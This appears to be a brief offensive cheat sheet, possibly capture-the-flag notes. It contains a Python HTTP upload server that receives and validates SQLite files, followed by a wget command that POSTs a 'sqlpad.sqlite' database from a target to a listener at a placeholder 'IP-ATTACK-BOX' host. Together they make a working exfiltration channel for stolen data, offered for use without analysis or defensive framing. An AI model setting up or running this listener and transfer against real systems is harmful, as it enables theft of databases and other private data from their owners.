### Start Python Server

from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import sqlite3

class SQLiteUploadHandler(BaseHTTPRequestHandler):
    upload_dir = "uploads"

    def do_POST(self):
        # read header for file-size
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # create directory if not existing
        os.makedirs(self.upload_dir, exist_ok=True)

        # save file as "uploaded_file.sqlite"
        file_path = os.path.join(self.upload_dir, "uploaded_file.sqlite")
        with open(file_path, "wb") as f:
            f.write(post_data)

        # Check for valid sql-file
        if self.is_valid_sqlite(file_path):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"SQLite-file successfully uploaded and valid")
        else:
            os.remove(file_path)  # delete non valid file
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"The uploaded file is not a valid sqllite-file")

    def is_valid_sqlite(self, file_path):
        """Check if its a valid SQLite-Database."""
        try:
            with sqlite3.connect(file_path) as conn:
                conn.execute("SELECT 1")  # Testrequest
            return True
        except sqlite3.Error:
            return False

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"This server accepts post requests for sqlite files")

# Start Server
if __name__ == "__main__":
    host = "0.0.0.0"
    port = 8000
    print(f"Server running on http://{host}:{port}")
    server = HTTPServer((host, port), SQLiteUploadHandler)
    server.serve_forever()

----------------------------------
Start Python-Server

python3 post_server.py
Transfer File

wget --method=POST --body-file=sqlpad.sqlite http://IP-ATTACK-BOX:8000/
